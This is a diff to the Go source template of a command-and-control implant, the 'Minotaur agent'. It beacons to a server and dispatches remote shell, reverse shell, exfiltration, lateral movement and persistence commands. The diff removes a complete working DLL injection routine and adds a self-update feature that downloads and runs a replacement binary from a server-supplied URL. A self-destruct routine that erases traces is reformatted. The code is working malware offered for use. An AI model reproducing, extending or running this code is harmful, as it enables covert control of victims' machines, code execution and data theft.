@@ -15,10 +15,6 @@ import (
 	"runtime"
 	"strconv"
 	"time"
-
-	// Windows API imports – only used on Windows; safe on other OS
-	"syscall"
-	"unsafe"
 )
 
 type Config struct {
@@ -28,6 +24,7 @@ type Config struct {
 	UserAgent       string
 	InsecureTLS     bool
 	AutoPersistence bool
+	DebugMode       bool
 }
 
 var config = Config{
@@ -37,6 +34,7 @@ var config = Config{
 	UserAgent:       "{{ .UserAgent }}",
 	InsecureTLS:     {{ .InsecureTLS }},
 	AutoPersistence: {{ .AutoPersistence }},
+	DebugMode:       {{ .DebugMode }},
 }
 
 var agentID string
@@ -48,6 +46,8 @@ type AgentInfo struct {
 	OS       string `json:"os"`
 	IP       string `json:"ip"`
 	Arch     string `json:"arch"`
+	Version  string `json:"version"`
+	Platform string `json:"platform"`
 }
 
 type Command struct {
@@ -76,7 +76,15 @@ func init() {
 }
 
 func logf(format string, args ...interface{}) {
-	fmt.Printf("[MINOTAUR] "+format+"\n", args...)
+	if config.DebugMode {
+		fmt.Printf("[MINOTAUR] "+format+"\n", args...)
+	}
+	// Always log to file in temp directory
+	f, err := os.OpenFile(os.TempDir()+"/minotaur_agent.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err == nil {
+		defer f.Close()
+		fmt.Fprintf(f, "[MINOTAUR] "+format+"\n", args...)
+	}
 }
 
 func getHostname() string {
@@ -103,6 +111,8 @@ func register() {
 		OS:       runtime.GOOS,
 		IP:       getOutboundIP(),
 		Arch:     runtime.GOARCH,
+		Version:  "{{ .AgentVersion }}",
+		Platform: runtime.GOOS + "/" + runtime.GOARCH,
 	}
 	jsonData, _ := json.Marshal(info)
 	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/register", bytes.NewBuffer(jsonData))
@@ -131,7 +141,11 @@ func register() {
 }
 
 func beacon() ([]Command, error) {
-	info := AgentInfo{ID: agentID}
+	info := AgentInfo{
+		ID:       agentID,
+		Version:  "{{ .AgentVersion }}",
+		Platform: runtime.GOOS + "/" + runtime.GOARCH,
+	}
 	jsonData, _ := json.Marshal(info)
 	req, err := http.NewRequest("POST", config.ServerURL+"/api/agent/beacon", bytes.NewBuffer(jsonData))
 	if err != nil {
@@ -152,6 +166,9 @@ func beacon() ([]Command, error) {
 
 	var commands []Command
 	err = json.NewDecoder(resp.Body).Decode(&commands)
+	if config.DebugMode {
+		logf("Beacon returned %d command(s)", len(commands))
+	}
 	return commands, err
 }
 
@@ -182,6 +199,9 @@ func sendResult(result CommandResult) error {
 		return err
 	}
 	defer resp.Body.Close()
+	if config.DebugMode {
+		logf("Sent result for command %s", result.CommandID)
+	}
 	return nil
 }
 
@@ -344,69 +364,6 @@ func lateralMovement(target, user, password, command string) (string, error) {
 	}
 }
 
-// ==================== DLL INJECTION (Windows only) ====================
-func doDllInject(dllPath, pidStr string) string {
-	if runtime.GOOS != "windows" {
-		return "DLL injection is only supported on Windows"
-	}
-	pid, err := strconv.Atoi(pidStr)
-	if err != nil {
-		return fmt.Sprintf("Invalid PID: %s", pidStr)
-	}
-
-	// Load kernel32.dll and get procedure addresses
-	kernel32 := syscall.NewLazyDLL("kernel32.dll")
-	procOpenProcess := kernel32.NewProc("OpenProcess")
-	procVirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	procWriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	procGetProcAddress := kernel32.NewProc("GetProcAddress")
-	procCreateRemoteThread := kernel32.NewProc("CreateRemoteThread")
-	procWaitForSingleObject := kernel32.NewProc("WaitForSingleObject")
-
-	// Open target process
-	PROCESS_ALL_ACCESS := uint32(0x1F0FFF)
-	processHandle, _, lastErr := procOpenProcess.Call(uintptr(PROCESS_ALL_ACCESS), 0, uintptr(pid))
-	if processHandle == 0 {
-		return fmt.Sprintf("OpenProcess failed: %v", lastErr)
-	}
-	defer syscall.CloseHandle(syscall.Handle(processHandle))
-
-	// Allocate memory in the target process
-	const MEM_COMMIT = 0x1000
-	const MEM_RESERVE = 0x2000
-	const PAGE_READWRITE = 0x04
-	size := uintptr(len(dllPath) + 1)
-	remoteMem, _, lastErr := procVirtualAllocEx.Call(processHandle, 0, size, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE)
-	if remoteMem == 0 {
-		return fmt.Sprintf("VirtualAllocEx failed: %v", lastErr)
-	}
-
-	// Write DLL path to allocated memory
-	var written uintptr
-	_, _, lastErr = procWriteProcessMemory.Call(processHandle, remoteMem, uintptr(unsafe.Pointer(&[]byte(dllPath)[0])), size, uintptr(unsafe.Pointer(&written)))
-	if lastErr != nil && lastErr.Error() != "The operation completed successfully." {
-		return fmt.Sprintf("WriteProcessMemory failed: %v", lastErr)
-	}
-
-	// Get address of LoadLibraryA
-	loadLibAddr, _, _ := procGetProcAddress.Call(kernel32.Handle(), uintptr(unsafe.Pointer(&[]byte("LoadLibraryA")[0])))
-	if loadLibAddr == 0 {
-		return "GetProcAddress for LoadLibraryA failed"
-	}
-
-	// Create remote thread to call LoadLibraryA
-	threadHandle, _, lastErr := procCreateRemoteThread.Call(processHandle, 0, 0, loadLibAddr, remoteMem, 0, 0)
-	if threadHandle == 0 {
-		return fmt.Sprintf("CreateRemoteThread failed: %v", lastErr)
-	}
-	defer syscall.CloseHandle(syscall.Handle(threadHandle))
-
-	// Wait for the thread to finish (optional, 5 seconds timeout)
-	procWaitForSingleObject.Call(threadHandle, 5000)
-
-	return fmt.Sprintf("DLL injected successfully into PID %d", pid)
-}
-
 // ==================== PERSISTENCE ====================
 func setupPersistence() (string, error) {
 	exePath, err := os.Executable()
@@ -563,48 +520,102 @@ func exfiltrateFile(filePath string) error {
 	return nil
 }
 
+// ==================== SELF-UPDATE ====================
+func selfUpdate(downloadURL string, newVersion string) error {
+	logf("Starting self‑update to version %s from %s", newVersion, downloadURL)
+	resp, err := client.Get(downloadURL)
+	if err != nil {
+		return err
+	}
+	defer resp.Body.Close()
 
-// ==================== SELF-DESTRUCT (removes all persistence) ====================
+	tmpFile, err := os.CreateTemp("", "minotaur_update_")
+	if err != nil {
+		return err
+	}
+	defer tmpFile.Close()
+
+	_, err = io.Copy(tmpFile, resp.Body)
+	if err != nil {
+		return err
+	}
+	tmpFile.Close()
+
+	exePath, err := os.Executable()
+	if err != nil {
+		return err
+	}
+
+	if runtime.GOOS == "windows" {
+		// Use a batch file to replace the executable and restart
+		batchContent := fmt.Sprintf(`@echo off
+timeout /t 2 /nobreak > nul
+move /Y "%s" "%s.bak"
+move /Y "%s" "%s"
+start "" "%s"
+del "%%~f0"`, tmpFile.Name(), exePath, tmpFile.Name(), exePath, exePath)
+		batchPath := filepath.Join(os.TempDir(), "minotaur_update.bat")
+		err = os.WriteFile(batchPath, []byte(batchContent), 0700)
+		if err != nil {
+			return err
+		}
+		cmd := exec.Command("cmd", "/c", batchPath)
+		cmd.Start()
+		os.Exit(0)
+	} else {
+		// Linux / macOS: replace and restart
+		err = os.Rename(tmpFile.Name(), exePath)
+		if err != nil {
+			return err
+		}
+		err = os.Chmod(exePath, 0755)
+		if err != nil {
+			return err
+		}
+		cmd := exec.Command(exePath)
+		cmd.Start()
+		os.Exit(0)
+	}
+	return nil
+}
+
+// ==================== SELF-DESTRUCT ====================
 func selfDestruct() {
-    logf("Self‑destruct initiated")
-    if runtime.GOOS == "windows" {
-        // Remove scheduled task
-        exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
-    } else if runtime.GOOS == "linux" {
-        // Remove systemd service
-        exec.Command("systemctl", "stop", "minotaur-agent.service").Run()
-        exec.Command("systemctl", "disable", "minotaur-agent.service").Run()
-        os.Remove("/etc/systemd/system/minotaur-agent.service")
-        exec.Command("systemctl", "daemon-reload").Run()
-        // Remove crontab entry
-        exec.Command("bash", "-c", "crontab -l | grep -v 'minotaur_agent' | crontab -").Run()
-    }
-    // Self‑delete the executable
-    exePath, err := os.Executable()
-    if err != nil {
-        exePath = os.Args[0]
-    }
-    if runtime.GOOS == "windows" {
-        batchContent := fmt.Sprintf("@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"%s\"\ndel /f /q \"%%~f0\"", exePath)
-        batchPath := filepath.Join(os.TempDir(), "minotaur_cleanup.bat")
-        os.WriteFile(batchPath, []byte(batchContent), 0700)
-        cmd := exec.Command("cmd", "/c", batchPath)
-        cmd.Start()
-    } else {
-        scriptContent := fmt.Sprintf("#!/bin/sh\nsleep 2\nrm -f \"%s\"\nrm -f \"$0\"", exePath)
-        scriptPath := filepath.Join(os.TempDir(), "minotaur_cleanup.sh")
-        os.WriteFile(scriptPath, []byte(scriptContent), 0700)
-        cmd := exec.Command("/bin/sh", scriptPath)
-        cmd.Start()
-    }
-    os.Exit(0)
+	logf("Self‑destruct initiated")
+	if runtime.GOOS == "windows" {
+		exec.Command("schtasks", "/delete", "/tn", "MinotaurAgent", "/f").Run()
+	} else if runtime.GOOS == "linux" {
+		exec.Command("systemctl", "stop", "minotaur-agent.service").Run()
+		exec.Command("systemctl", "disable", "minotaur-agent.service").Run()
+		os.Remove("/etc/systemd/system/minotaur-agent.service")
+		exec.Command("systemctl", "daemon-reload").Run()
+		exec.Command("bash", "-c", "crontab -l | grep -v 'minotaur_agent' | crontab -").Run()
+	}
+	exePath, err := os.Executable()
+	if err != nil {
+		exePath = os.Args[0]
+	}
+	if runtime.GOOS == "windows" {
+		batchContent := fmt.Sprintf("@echo off\ntimeout /t 2 /nobreak > nul\ndel /f /q \"%s\"\ndel /f /q \"%%~f0\"", exePath)
+		batchPath := filepath.Join(os.TempDir(), "minotaur_cleanup.bat")
+		os.WriteFile(batchPath, []byte(batchContent), 0700)
+		cmd := exec.Command("cmd", "/c", batchPath)
+		cmd.Start()
+	} else {
+		scriptContent := fmt.Sprintf("#!/bin/sh\nsleep 2\nrm -f \"%s\"\nrm -f \"$0\"", exePath)
+		scriptPath := filepath.Join(os.TempDir(), "minotaur_cleanup.sh")
+		os.WriteFile(scriptPath, []byte(scriptContent), 0700)
+		cmd := exec.Command("/bin/sh", scriptPath)
+		cmd.Start()
+	}
+	os.Exit(0)
 }
 
 // ==================== HELPER & UTILITY COMMANDS ====================
 func doHelp() string {
 	return `Available commands:
 help, sleep, checkin, pwd, cd, dir/ls, cat, mkdir, remove/rm, cp, upload, download,
-proc, net, shell, powershell, exfil, lateral, persistence, proxy, shell-reverse, dll, delete/exit`
+proc, net, shell, powershell, exfil, lateral, persistence, proxy, shell-reverse, update, delete/exit`
 }
 
 func doSleep(seconds string) string {
@@ -617,7 +628,7 @@ func doSleep(seconds string) string {
 }
 
 func doCheckin() string {
-	return fmt.Sprintf("Agent %s is active, last beacon: %s", agentID, time.Now().Format(time.RFC3339))
+	return fmt.Sprintf("Agent %s is active, version %s, last beacon: %s", agentID, "{{ .AgentVersion }}", time.Now().Format(time.RFC3339))
 }
 
 func doConfig(setting, value string) string {
@@ -626,6 +637,9 @@ func doConfig(setting, value string) string {
 
 // ==================== COMMAND DISPATCHER ====================
 func processCommand(cmd Command) {
+	if config.DebugMode {
+		logf("Processing command: type=%s, payload=%v", cmd.Type, cmd.Payload)
+	}
 	switch cmd.Type {
 	case "exec":
 		output, errMsg := executeCommand(cmd.Payload["command"])
@@ -707,9 +721,17 @@ func processCommand(cmd Command) {
 		port := cmd.Payload["port"]
 		go spawnReverseShell(ip, port)
 		sendResult(CommandResult{CommandID: cmd.ID, Output: "Reverse shell spawning", Error: ""})
-	case "dll":
-		output := doDllInject(cmd.Payload["dll_path"], cmd.Payload["pid"])
-		sendResult(CommandResult{CommandID: cmd.ID, Output: output, Error: ""})
+	case "update":
+		url := cmd.Payload["url"]
+		newVersion := cmd.Payload["version"]
+		err := selfUpdate(url, newVersion)
+		if err != nil {
+			sendResult(CommandResult{CommandID: cmd.ID, Error: err.Error()})
+		} else {
+			sendResult(CommandResult{CommandID: cmd.ID, Output: "Update successful, restarting"})
+			time.Sleep(1 * time.Second)
+			os.Exit(0)
+		}
 	case "delete", "exit":
 		go selfDestruct()
 		return
@@ -721,7 +743,10 @@ func processCommand(cmd Command) {
 
 // ==================== MAIN ====================
 func main() {
-	logf("Starting Minotaur agent on %s/%s", runtime.GOOS, runtime.GOARCH)
+	if config.DebugMode {
+		fmt.Println("[MINOTAUR] Debug mode enabled")
+	}
+	logf("Starting Minotaur agent version %s on %s/%s", "{{ .AgentVersion }}", runtime.GOOS, runtime.GOARCH)
 	register()
 	if agentID == "" {
 		logf("Registration failed, exiting after 10 seconds")
@@ -751,7 +776,7 @@ func main() {
 			logf("Beacon error: %v", err)
 			continue
 		}
-		if len(commands) > 0 {
+		if len(commands) > 0 && config.DebugMode {
 			logf("Received %d command(s)", len(commands))
 		}
 		for _, cmd := range commands {
